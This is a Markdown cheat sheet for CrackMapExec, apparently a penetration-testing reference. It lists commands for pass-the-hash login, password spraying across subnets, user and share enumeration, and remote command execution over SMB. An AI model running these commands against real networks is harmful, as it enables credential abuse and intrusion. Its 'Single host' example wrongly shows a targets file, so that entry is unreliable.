# CrackMapExec (CME) Cheat Sheet

## What is CrackMapExec?
CrackMapExec (CME) is a `post-exploitation tool` used to automate assessment and lateral movement across Windows/Active Directory environments over protocols like SMB, WinRM, RDP, and LDAP.
It works by taking credentials (or hashes) and spraying/authenticating them across targets to enumerate users, shares, sessions, and execute commands—making it useful for credential validation, privilege discovery, and rapid network-wide compromise mapping.


## General Help

- Display general help:  
```
crackmapexec --help
```

- Display help for a specific protocol (e.g., SMB):
```
crackmapexec smb --help
```

## Target Specification

- Single host:
```
crackmapexec smb targets.txt
```

## Authentication
- Null session:
```
crackmapexec smb 192.168.1.10 -u '' -p ''
```

- Authenticate with username and password:
```
crackmapexec smb 192.168.1.10 -u 'username' -p 'password'
```

- Authenticate with NTLM hash (**Pass-the-Hash**):
```
crackmapexec smb 192.168.1.10 -u 'username' -H 'LMHASH:NTHASH'
```

- Use Kerberos authentication:
```
crackmapexec smb 192.168.1.10 -u 'username' -p 'password' -k
```

- Local authentication:
```
crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' --local-auth
```

- Multiple hosts:
```
crackmapexec smb 192.168.1.10 192.168.1.11
```

- CIDR notation:
```
crackmapexec smb 192.168.1.0/24
```

- IP range:
```
crackmapexec smb 192.168.1.10-20
```

- From a file:
```
crackmapexec smb targets.txt
```

## Password Spraying and Brute-Forcing
- Single user, multiple passwords:
```
crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'password1' 'password2'
```

- Multiple users, single password:
```
crackmapexec smb 192.168.1.0/24 -u 'user1' 'user2' -p 'P@ssword'
```

- From files:
```
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
```

- Continue on success:
```
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'password' --continue-on-success
```

## Enumeration
- Enumerate users:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --users
```

- RID brute-force to enumerate users:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rid-brute
```

- Enumerate groups:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --groups
```

- Enumerate shares:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --shares
```

- Enumerate sessions:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sessions
```

- Enumerate logged-on users:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --loggedon-users
```

- Enumerate password policy:
```
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --pass-pol
```

## Command Execution
- Execute command via SMB (requires admin privileges):  
```
crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -x 'whoami'
```

- Execute PowerShell command:
```
crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -X 'whoami'
```

- Specify execution method (e.g., smbexec, wmiexec, atexec):
```
crackmapexec smb 192.168.1.10 -u 'Administrator' -p 'password' -x 'whoami' --exec-method wmiexec
```